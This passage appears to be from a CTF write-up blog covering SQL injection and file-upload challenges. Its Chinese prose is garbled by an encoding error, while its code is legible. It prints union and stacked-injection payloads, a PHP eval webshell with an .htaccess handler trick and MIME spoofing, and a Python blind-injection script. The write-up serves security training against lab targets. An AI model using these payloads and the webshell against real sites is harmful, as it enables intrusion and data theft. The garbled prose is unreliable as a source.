ï¼Œåº”è¯¥ä¼šåœ¨åç»­è¿›è¡Œæ¯”å¯¹ã€‚æ­¤å¤–ï¼Œè¯¥æ³¨å…¥ç‚¹å¯å›æ˜¾æŠ¥é”™ä¿¡æ¯ï¼Œä¸è¿‡å®æµ‹æœ¬é¢˜å±è”½äº†å°æ‹¬å·ï¼Œå› æ­¤æŠ¥é”™æ³¨å…¥ä¾¿ä¸å¤ªå¥½å®ç°äº†ï¼Œä½†æ˜¯å¯ä»¥ç¡®å®šæ³¨å…¥ç‚¹é—­åˆç¬¦å·ä¸ºå•å¼•å·ã€‚</p><img src="0030.webp" alt="" style="zoom:75%"></li><li><p>ç”±äºå¯†ç æ˜¯å–æŸ¥è¯¢ç»“æœæ¥è¿›è¡Œå¯¹æ¯”çš„ï¼Œå› æ­¤å¦‚æœä½¿ç”¨ <kbd>union</kbd> æ„é€ æˆ‘ä»¬ç›¸è¦çš„ç»“æœï¼Œè™½ç„¶ä¸èƒ½çˆ†å‡ºæ•°æ®ï¼Œä½†ç™»å½•ç®¡ç†å‘˜ <kbd>admin</kbd> è´¦å·è¿˜æ˜¯å¯ä»¥çš„ã€‚ä¸è¿‡åœ¨æ­¤ä¹‹å‰è¿˜éœ€è¦å¯¹åŸ SQL è¯­å¥æŸ¥è¯¢çš„å­—æ®µåå³é¡ºåºåšä¸ªç¡®è®¤ï¼Œå®æµ‹æŸ¥è¯¢è¿˜å±è”½äº† <kbd>or</kbd>ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨ <kbd>order by</kbd> åˆ¤æ–­çœŸå®æŸ¥è¯¢å­—æ®µæ•°ï¼Œä½†æ˜¯è”åˆæ³¨å…¥å¯ä»¥æ›¿ä»£ï¼Œä¾‹å¦‚å¦‚ä¸‹ <kbd>payload</kbd> ä¼šå›æ˜¾é”™è¯¯å¯†ç ï¼Œè¯´æ˜å…±æŸ¥è¯¢ä¸‰ä¸ªå­—æ®µä¸”ç¬¬äºŒä¸ªå­—æ®µä¸ºç”¨æˆ·åã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,&#x27;admin&#x27;,3#</span><br></pre></td></tr></table></figure></li><li><p>å‰æœŸå¹¶ä¸èƒ½åˆ¤æ–­å¯†ç åœ¨ç¬¬ä¸€ä½è¿˜æ˜¯æœ€åä¸€ä½ï¼Œä¸è¿‡æ ¹æ®ç»éªŒï¼Œè‚¯å®šæ—¶æœ€åæ²¡è·‘äº†ã€‚æ‰€ä»¥å¯ä»¥åœ¨ç”¨æˆ·åå¤„æ„é€  <kbd>payload</kbd> å¦‚ä¸‹ï¼Œæ­¤æ—¶æŸ¥è¯¢å‡ºæ¥çš„ç”¨æˆ·åå¯†ç å°±å˜æˆäº† <kbd>admin</kbd> å’Œ <kbd>h-t-m</kbd>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,&#x27;admin&#x27;,&#x27;h-t-m&#x27;#</span><br></pre></td></tr></table></figure><p>å¾ˆä¸æ»‘ï¼Œä½†æ˜¯ä¸è¡Œï¼Œå› ä¸ºå¯†ç è¢«å¤„ç†è¿‡äº†ã€‚æœ€å¸¸ç”¨çš„å½“ç„¶æ—¶ MD5 åŠ å¯†ï¼Œå®æµ‹æœ¬é¢˜ä¾æ—§å¦‚æ­¤ï¼Œæ•°æ®åº“ä¸­å­˜å‚¨çš„æ•°æ®ä¸ºå¯†ç çš„ MD5 åŠ å¯†åçš„æ•°æ®ï¼Œå› æ­¤éœ€è¦ä¿®æ”¹ç”¨æˆ·åå¤„çš„ <kbd>payload</kbd> å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,&#x27;admin&#x27;,&#x27;3f4a7c65b1ddcf47a604efa9efe4c069&#x27;#</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è¾“å…¥å¯†ç  <kbd>h-t-m</kbd> å³å¯ç™»å½•ç®¡ç†å‘˜è´¦æˆ·ï¼Œé¡µé¢åªæœ‰ <kbd>flag</kbd>ï¼Œæ‰€ä»¥æœ¬é¢˜çš„ä»»åŠ¡çœŸçš„å°±åªæ˜¯ç™»å½•ç®¡ç†å‘˜è´¦æˆ·è€Œå·²ã€‚<psw>ç¬”è€…ä¸€è‡´ç¢ç£¨çˆ†åº“æ¥ç€ã€‚</psw></p></li></ul><h2 id="GXYCTF2019-BabyUpload">[GXYCTF2019]BabyUpload</h2><ul><li><p>æ‰“å¼€é¶æœºä¸ºä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œå®æµ‹å¹¶ä¸æ”¯æŒ PNG ä¸ GIF æ ¼å¼çš„å›¾ç‰‡ï¼ŒåªæˆåŠŸä¸Šä¼ äº† JPG å›¾ç‰‡ã€‚ä¸è¿‡å¤§æ¦‚æ˜¯å› ä¸ºå¹³å°é™åˆ¶æ‰€ä»¥ç•¥å¤§çš„å›¾ç‰‡å‡æ— æ³•ä¸Šä¼ ï¼Œè€Œç¼©å°ä½“ç§¯ä¹‹åä¾¿å¯æˆåŠŸä¸Šä¼ ï¼Œå¹¶ä¸”ä¼šå›æ˜¾ä¸Šä¼ è·¯å¾„ï¼Œå¤ªé€‚åˆä¼ é©¬äº†ã€‚</p><img src="0031.webp" alt="" style="zoom:75%"></li><li><p>ç›´æ¥ä¸Šä¼  PHP æœ¨é©¬æ–‡ä»¶ï¼Œç½‘é¡µä¼šæç¤ºåç¼€åä¸èƒ½æœ‰ <kbd>ph</kbd>ï¼š</p><img src="0032.webp" alt="" style="zoom:75%"><p>å› æ­¤æœ¬é¢˜å¯¹åç¼€åä½œäº†è¿‡æ»¤ï¼Œé™åˆ¶ä¸º <kbd>ph</kbd> çš„è¯åŸºæœ¬åç¼€åçš„åˆ«åéƒ½ä¸èƒ½ç”¨äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯å°è¯•ä¸Šä¼ ä¸€èˆ¬åç¼€åæ–‡ä»¶å¹¶ä¸Šä¼ é…ç½®æ–‡ä»¶å°†å…¶è§£æä¸º PHP ç¨‹åºã€‚é¦–å…ˆè¿˜æ˜¯æŠŠæœ¨é©¬æ–‡ä»¶ä¼ ä¸Šå»ï¼Œä¿®æ”¹åç¼€åä¸º <kbd>h-t-m</kbd>ï¼ŒæˆåŠŸç»•è¿‡äº†åç¼€åæ£€æµ‹ï¼Œä½†æ˜¯æµè§ˆå™¨å†æ¬¡å›æ˜¾é”™è¯¯ï¼š</p><img src="0033.webp" alt="" style="zoom:75%"><p>è€ƒè™‘åˆ°åˆæœŸæµ‹è¯•å‘ç°åªèƒ½ä¸Šä¼  JPG å›¾ç‰‡ï¼Œå› æ­¤åå°å¤§æ¦‚ç‡å¯¹ MIME ä¿¡æ¯ä¹Ÿåšäº†æ£€æµ‹ï¼ŒæŠ“åŒ…ä¿®æ”¹ä¸º <kbd>image/jpeg</kbd> åå›æ˜¾å¦‚ä¸‹ï¼š</p><img src="0034.webp" alt="" style="zoom:75%"><p>è¿™ä¹ˆé’ˆå¯¹ PHPï¼Œè‚¯å®šè¿‡æ»¤äº† <kbd>&#60;?</kbd>ï¼Œä½¿ç”¨å¦‚ä¸‹ä¸€å¥è¯æœ¨é©¬æ¥ç»•è¿‡å°±å¥½ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt; @eval($_POST[&#x27;h-t-m&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>éšåå³å¯çœ‹åˆ°ä¸Šä¼ æˆåŠŸçš„æç¤ºï¼Œå¦‚æ­¤ä¸€æ¥ä¾¿å¿«æ‹¿ä¸‹æœ¬é¢˜äº†ã€‚</p></li><li><p>æ¥ä¸‹æ¥å°±è¯¥ä¸Šä¼ é…ç½®æ–‡ä»¶äº†ï¼Œè€æ ·å­è¿˜æ˜¯ <kbd>.htaccess</kbd> æ–‡ä»¶ï¼Œå…¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;muma.h-t-m&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ—¶è®°å¾—æŠŠ MIME ä¿¡æ¯æ”¹ä¸º <kbd>image/jpeg</kbd>ï¼Œç„¶åå°±æˆåŠŸä¸Šä¼ äº†ã€‚ä¹‹åä½¿ç”¨èšå‰‘ç›´æ¥è¿æ¥ <kbd>muma.h-t-m</kbd> æ–‡ä»¶å³å¯ï¼Œæ­¤å¤„ä¸å†èµ˜è¿°ã€‚</p></li></ul><h2 id="GYCTF2020-Blacklist">[GYCTF2020]Blacklist</h2><ul><li><p>æ‰“å¼€é¶æœºæ˜¯ä¸€ä¸ªç®€å•çš„æŸ¥è¯¢æ¡†ï¼Œè¾“å…¥æ•°å­—å³å¯è¿”å›æŸ¥è¯¢ç»“æœï¼Œä» URL çš„å˜åŒ–å¯ä»¥ç¡®å®šæ•°æ®ä»¥ GET æ–¹æ³•æäº¤ã€‚å…¶ä¸­ï¼Œè‹¥åŠ ä¸Šè½¬ä¹‰ç¬¦å·ï¼Œæµè§ˆå™¨åˆ™ä¼šå›æ˜¾æŠ¥é”™ï¼Œå¯ä»¥çœ‹å‡ºé—­åˆç¬¦å·ä¸ºå•å¼•å·ã€‚</p><img src="0035.webp" alt="" style="zoom:75%"></li><li><p>æ¥ä¸‹æ¥å°±å¯ä»¥æ…¢æ…¢æ³¨å…¥äº†ï¼Œé¦–å…ˆåˆ¤æ–­åå°å®é™…æŸ¥è¯¢çš„å­—æ®µæ•°ã€‚é€šè¿‡å¦‚ä¸‹ä¸¤ä¸ª <kbd>payload</kbd> çš„ååº”å¯åˆ¤æ–­å­—æ®µæ•°ä¸º <kbd>2</kbd>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;order by 2--+</span><br><span class="line">?inject=1&#x27;order by 3--+</span><br></pre></td></tr></table></figure></li><li><p>ç”±äºæ­£å¸¸æŸ¥è¯¢æ—¶æµè§ˆå™¨ä»…å›æ˜¾äº†ä¸¤ä¸ªæ•°æ®ï¼Œå› æ­¤ä¸å¿…åˆ¤æ–­å›æ˜¾ä½ï¼Œæ¯•ç«Ÿä»–ä»¬éƒ½å¯ä»¥å›æ˜¾ã€‚ä½†æ˜¯åé¢ç»§ç»­æŸ¥è¯¢æ—¶åˆ™ä¼šè¿”å›å¦‚ä¸‹è¯­å¥ï¼Œå¯ä»¥å‘ç°å¾ˆå¤šå…³é”®è¯éƒ½è¢«å±è”½äº†ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•ä½¿ç”¨è¿™äº›å…³é”®è¯å®Œæˆåç»­æŸ¥è¯¢ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure></li><li><p>ä¸è¿‡ï¼Œ<kbd>show</kbd> å¹¶æ²¡æœ‰è¢«å±è”½ï¼Œå› æ­¤å¯ä»¥å°è¯•ä½¿ç”¨å †å æ³¨å…¥æ‰§è¡Œ <kbd>show</kbd> è¯­å¥æ¥è·å–ä¸€äº›ä¿¡æ¯ã€‚ä¸è¿‡å¾—å…ˆç¡®è®¤æµè§ˆå™¨å¯ä»¥å›æ˜¾å †å æŸ¥è¯¢å¾—ç»“æœï¼Œå¦‚ä¸‹ <kbd>payload</kbd> å¯æŸ¥è¯¢å‡ºæ‰€æœ‰çš„æ•°æ®åº“åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=0&#x27;;show databases;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡å¦‚æœéœ€è¦äº†è§£å½“å‰æ•°æ®åº“çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥è°ƒç”¨ <kbd>database()</kbd> å‡½æ•°æ¥å®Œæˆï¼Œè¿™æ ·ä¸éœ€è¦ç”¨åˆ°é»‘åå•ä¸­çš„å…³é”®å­—ã€‚<kbd>payload</kbd> å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=0&#x27;+and+extractvalue(1%2Cconcat(&#x27;~+&#x27;%2Cdatabase()%2C&#x27;+~&#x27;))--+</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœå¦‚ä¸‹ï¼Œå¯çŸ¥å½“å‰ä½¿ç”¨çš„æ•°æ®åº“åä¸º <kbd>supersqli</kbd>ã€‚</p><img src="0036.webp" alt="" style="zoom:75%"></li><li><p>æ¥ä¸‹æ¥ä½¿ç”¨å¦‚ä¸‹ <kbd>payload</kbd> å³å¯æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨åã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=0&#x27;;show tables;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœå¦‚ä¸‹ï¼Œå¯çŸ¥å½“å‰æ•°æ®åº“ä¸‹å…±æœ‰ä¸¤å¼ è¡¨ï¼Œåˆ†åˆ«æ˜¯ <kbd>FlagHere</kbd> ä¸ <kbd>words</kbd>ã€‚</p><img src="0037.webp" alt="" style="zoom:75%"><p>å½“ç„¶ä¹Ÿå¯ä»¥åŠ ä¸Š <kbd>from</kbd> æ¥æŸ¥è¯¢å…¶ä»–æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨åï¼Œæ¯”å¦‚å¦‚ä¸‹ <kbd>payload</kbd> å¯æŸ¥è¯¢æ­¤å‰æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®åº“ <kbd>ctftraining</kbd> ä¸­çš„æ‰€æœ‰è¡¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=0&#x27;;show tables from ctftraining;</span><br></pre></td></tr></table></figure></li><li><p>æ ¹æ®è¡¨åçš„æç¤ºå¯ä»¥è®¤ä¸º <kbd>flag</kbd> å°±åœ¨ <kbd>FlagHere</kbd> è¡¨ä¸­ï¼Œå› æ­¤æ¥ä¸‹æ¥ç›´æ¥è¯»å–è¿™å¼ è¡¨å³å¯ã€‚ç”±äº <kbd>select</kbd> è¢«å±è”½ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ç”¨åˆ° <kbd>handler</kbd> æ¥çˆ†å‡ºè¡¨ä¸­æ•°æ®ã€‚<kbd>payload</kbd> å¦‚ä¸‹ï¼Œå…ˆ <kbd>open</kbd> ç„¶åå°±å¯ä»¥è¯»æ•°æ®äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=0&#x27;;handler FlagHere open;handler FlagHere read first;</span><br></pre></td></tr></table></figure><p>ç”±äº <kbd>flag</kbd> å°±åœ¨ç¬¬ä¸€è¡Œï¼Œå› æ­¤è¯»å– <kbd>first</kbd> ä¾¿å¯æ‹¿åˆ° <kbd>flag</kbd>ï¼Œè‹¥éœ€è¦ç»§ç»­å¾€ä¸‹è¯»å–çš„è¯å¯ä»¥ <kbd>read next</kbd>ã€‚å‡ºäºç¤¼è²Œï¼Œä¹Ÿå¯ä»¥åœ¨æœ€åå°†è¯¥æ“ä½œ <kbd>close</kbd> æ‰ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=0&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</span><br></pre></td></tr></table></figure></li></ul><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World">[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><ul><li><p>æ‰“å¼€é¶æœºå†æ¬¡æ˜¯ä¸ªç®€å•çš„æŸ¥è¯¢é¡µé¢ï¼Œå¹¶ä¸”æ˜ç¡®å‘Šè¯‰æˆ‘ä»¬ <kbd>flag</kbd> å°±åœ¨ <kbd>flag</kbd> è¡¨ <kbd>flag</kbd> å­—æ®µä¸­ã€‚</p><img src="0038.webp" alt="" style="zoom:75%"></li><li><p>ç»è¿‡æµ‹è¯•ï¼Œä»…æœ‰åœ¨è¾“å…¥æ•°æ®ä¸º <kbd>1</kbd> æˆ– <kbd>2</kbd> æ—¶æœ‰æ•ˆï¼Œå…¶ä½™å‡å›æ˜¾æŸ¥è¯¢å‡ºé”™æˆ–åœ¨æ£€æµ‹åˆ°å…³é”®è¯æ—¶å›æ˜¾å‘ç° SQL æ³¨å…¥ï¼Œå®æµ‹åŠ å‡ä¹˜ã€<kbd>union</kbd>ã€ç©ºæ ¼ã€åŒå¼•å·ã€åˆ†å·ã€<kbd>or</kbd>ã€<kbd>and</kbd> åŠå…¶ç¬¦å·è¡¨è¾¾ç­‰ç­‰è®¸å¤šæ³¨å…¥å¸¸ç”¨å…³é”®å­—å‡è¢«å±è”½ã€‚ä¸è¿‡ <kbd>select</kbd>ã€<kbd>from</kbd> å¹¶æ²¡æœ‰è¢«å±è”½ï¼Œä½†æ˜¯åœ¨è¿™ç§æƒ…å†µä¸‹è²Œä¼¼å¹¶ä¸å¥½åˆ©ç”¨ã€‚è¿˜æœ‰é™¤å·æ²¡è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥å…ˆæµ‹è¯•æ˜¯å¦ä¸ºæ•°å­—å‹æ³¨å…¥ï¼Œä½¿ç”¨ä»¥ä¸‹è¡¨è¾¾å¼ä½œä¸º <kbd>payload</kbd>ï¼Œæäº¤ä¹‹åå‘ç°å…¶ç­‰ä»·äº <kbd>2</kbd>ï¼Œå› æ­¤æ­¤å¤„ä¸ºæ•°å­—å‹æ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6/3</span><br></pre></td></tr></table></figure><p>æ­¤å¤–åœ¨æµ‹è¯•ä¸­ç¬”è€…å‘ç°å½“å…³é”®å­—å‡ºç°åœ¨å­—ç¬¦é¦–å°¾æ˜¯ä¾¿ä¸ä¼šæ£€æµ‹åˆ°ï¼Œå› æ­¤åå°å¤§æ¦‚ç‡æ˜¯æ ¹æ®å…³é”®è¯ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®æ¥ä½œä¸ºæ£€æµ‹ä¾æ®å¹¶ä¸”æ²¡æœ‰å®Œæˆå¯¹ <kbd>False</kbd> ä¸ <kbd>0</kbd> çš„åŒºåˆ†ã€‚</p></li><li><p>å¤§éƒ¨åˆ†å¸¸è§„æ³¨å…¥éƒ½è¢«æœ‰æ•ˆå±è”½ï¼Œç»è¿‡å„ç§å°è¯•å¤±è´¥åï¼Œåªå¥½é€‰æ‹©æœ€éº»çƒ¦çš„ç›²æ³¨ï¼Œæ¯•ç«Ÿé‚£äº›å‡½æ•°è¿˜æ˜¯åŸºæœ¬æ²¡æœ‰è¢«è¿‡æ»¤çš„ï¼Œåœ¨å‚è§‚å…¶ä»–å¸ˆå‚…ä»¬çš„é¢˜è§£åå‘ç°æœ¬é¢˜è€ƒçš„å°±æ˜¯ç›²æ³¨ã€‚æœ¬é¢˜åœ¨å¸¸è§„æŸ¥è¯¢æ—¶å­˜åœ¨ä¸‰ç§å›æ˜¾ï¼Œå› æ­¤å¸ƒå°”ç›²æ³¨å®Œå…¨å¯ç”¨ï¼Œæ­£å¥½æ­¤å¤„ä¸ºæ•°å­—å‹æ³¨å…¥ï¼Œç›´æ¥ä¼ ä¸€ä¸ª <kbd>if</kbd> è¡¨è¾¾å¼å³å¯ã€‚<kbd>flag</kbd> æ‰€åœ¨è¡¨ä¸å­—æ®µå·²çŸ¥ï¼Œæ•…å¯ä»¥æ„é€ å¦‚ä¸‹ <kbd>payload</kbd>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((select(flag)from(flag)),1,1))&gt;ascii(&#x27;a&#x27;),1,2)</span><br></pre></td></tr></table></figure><p>æ‰‹å·¥ç›²æ³¨å¤ªç—›è‹¦äº†ï¼Œè¿˜æ˜¯å†™ä¸ªè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;[é¶æœºåœ°å€]&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    low = <span class="number">31</span></span><br><span class="line">    mid = (high + low) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)&quot;</span> % (n, mid)</span><br><span class="line">        <span class="built_in">id</span> = &#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url, data = <span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    x = <span class="built_in">int</span>(mid)</span><br><span class="line">    <span class="keyword">if</span> x != <span class="number">31</span>:</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        result += <span class="built_in">chr</span>(x)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨ç®€å•çš„äºŒåˆ†æŸ¥æ‰¾å®Œæˆç›²æ³¨ï¼Œå…¶ä¸­ç å€¼ <kbd>31</kbd> ç•™ä½œè¯†åˆ« <kbd>flag</kbd> æ˜¯å¦ç»“æŸï¼Œ<kbd>sleep()</kbd> å‡½æ•°åˆ™ç”¨äºé™ä½é¢‘ç‡ä»¥æŠµæ¶ˆå¹³å°çš„é¢‘ç‡é™åˆ¶ã€‚</p></li></ul><h2 id="ç½‘é¼æ¯-2018-Fakebook">[ç½‘é¼æ¯ 2018]Fakebook</h2><ul><li><p>æ‰“å¼€é¶æœºä¸ºä¸€ä¸ªä¼ªç¤¾äº¤ç½‘ç«™ï¼Œé¦–é¡µæœ‰ <kbd>join</kbd> ä¸ <kbd>login</kbd> ä¸¤ä¸ªåŠŸèƒ½æŒ‰é’®ï¼Œåˆ†åˆ«å¯¹åº”æ³¨å†Œä¸ç™»å½•åŠŸèƒ½ã€‚æ³¨å†Œæ—¶åœ¨ <kbd>blog</kbd> ä¼šè¦æ±‚å¡«å†™ URLï¼Œå¦‚ä¸‹ä¸ºç¬”è€…æ³¨å†Œçš„ä¸‰ä¸ªè´¦æˆ·ï¼Œ<kbd>blog</kbd> åˆ†åˆ«å¯¹åº” Bç«™çš„ä¸‰ç§å½¢å¼ URLï¼Œåç»­ä¼šç”¨åˆ°ã€‚</p><img src="0039.webp" alt="" style="zoom:75%"></li><li><p>ç‚¹å‡»ç”¨æˆ·åå³å¯è¿›å…¥è¯¥ç”¨æˆ·çš„ä¸»é¡µï¼Œç½‘é¡µä¸‹æ–¹è²Œä¼¼æœ‰ä¸€æ ä¸ºç”¨æˆ·åšå®¢çš„é¢„è§ˆï¼Œç•Œé¢å¤ªå°çœ‹ä¸åˆ°ï¼Œä½†æ˜¯åœ¨ç½‘é¡µæºç ä¸­å¯ä»¥çœ‹åˆ°ç¨‹åºè®¿é—®äº†ç”¨æˆ·çš„ <kbd>blog</kbd>ã€‚</p><img src="0040.webp" alt="" style="zoom:75%"><p>ç»è¿‡æµ‹è¯•ï¼Œç½‘ç«™å¹¶ä¸æ”¯æŒè·³è½¬é“¾æ¥ï¼Œå³ä¸Šè¿° URL ä¸­çš„ <kbd>bilibili.com</kbd> ä¼šè·³è½¬è‡³ <kbd>www.bilibili.com</kbd>ï¼Œè€Œç¨‹åºç›´æ¥è®¿é—® <kbd>bilibili.com</kbd> åˆ™ä¼šå›æ˜¾ <kbd>301</kbd> çŠ¶æ€ç ã€‚å½“ç„¶é‡ç‚¹åœ¨äºæœåŠ¡å™¨ç¡®å®å¯¹ç”¨æˆ·çš„åšå®¢é“¾æ¥å‘èµ·äº†è®¿é—®ï¼Œè¿™ä¸€ç‚¹å°±å¾ˆæœ‰ç”¨äº†ã€‚</p></li><li><p>åœ¨åˆ‡æ¢é¡µé¢çš„æ—¶å€™å¾ˆéš¾ä¸æ³¨æ„åˆ° URL ä¸­é€šè¿‡ GET æ–¹æ³•ä¼ è¾“çš„å˜é‡ <kbd>no</kbd>ï¼Œå› ä¸ºæ¶‰åŠåˆ°ç‰¹å®šæ•°æ®çš„å›æ˜¾ï¼Œæ‰€ä»¥å¤§æ¦‚ç‡ä½¿ç”¨äº†æ•°æ®åº“æŸ¥è¯¢ï¼Œå°è¯• SQLæ³¨å…¥ã€‚äº‹å®è¯æ˜ç¡®å®å­˜åœ¨ SQL æ³¨å…¥ï¼Œå¹¶ä¸”ç”±ä»¥ä¸‹ <kbd>payload</kbd> å¯ä»¥ç¡®å®šæ˜¯æ•°å­—å‹æ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=1 and 1=1</span><br><span class="line">/view.php?no=1 and 1=2</span><br></pre></td></tr></table></figure></li><li><p>ç»§ç»­ç”±ä»¥ä¸‹ä¸¤ä¸ª <kbd>payload</kbd> å¯çŸ¥åå°å…±æŸ¥è¯¢äº†å››ä¸ªå­—æ®µçš„æ•°æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=-1 order by 4--+</span><br><span class="line">/view.php?no=-1 order by 5--+</span><br></pre></td></tr></table></figure></li><li><p>ç„¶ååœ¨ä½¿ç”¨ <kbd>union</kbd> ç¡®å®šå›æ˜¾ä½çš„æ—¶å€™å‘ç°è¢«è¿‡æ»¤äº†ï¼Œå¹¶ä¸”è¿‡æ»¤çš„æ˜¯ <kbd>union</kbd> + ç©ºç™½å­—ç¬¦ + <kbd>select</kbd> çš„ç»„åˆï¼Œä½¿ç”¨å¤šè¡Œæ³¨é‡Šç¬¦ <kbd>/&#42;&#42;/</kbd> å³å¯ç»•è¿‡ï¼Œé€šè¿‡å¦‚ä¸‹ <kbd>payload</kbd> å¯ä»¥å‘ç°ç¬¬äºŒä¸ªæ•°æ®æˆåŠŸå›æ˜¾ï¼Œå› æ­¤å¯ä»¥ä»è¿™ä¸ªä½ç½®çˆ†å‡ºæ•°æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=-1 union/**/select 1,2,3,4--+</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯åœ¨å·¦ä¸Šè§’çš„æç¤ºä¸­æœ‰ååºåˆ—åŒ–å‡½æ•°ï¼Œå› æ­¤æ­¤å¤„åº”è¯¥è¿˜å­˜åœ¨åºåˆ—åŒ–çš„æ•°æ®ã€‚</p><img src="0041.webp" alt="" style="zoom:75%"></li><li><p>æ¥ä¸‹æ¥ä½¿ç”¨ <kbd>2</kbd> å·ä½çˆ†æ•°æ®ï¼Œé¦–å…ˆé€šè¿‡å¦‚ä¸‹ 